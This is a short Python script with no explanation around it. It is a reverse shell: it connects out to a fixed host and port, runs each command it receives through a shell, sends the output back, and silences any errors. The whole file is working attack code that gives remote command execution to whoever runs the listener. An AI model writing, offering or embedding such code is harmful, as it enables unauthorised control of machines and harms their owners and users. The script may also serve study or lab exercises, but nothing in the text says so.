#!/usr/bin/env python
import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.100", 8080))
try:
    while True:
        r = s.recv(1024)
        command = subprocess.check_output(r.decode('utf-8'), shell=True)
        s.send(command)
except Exception:
    pass
s.close()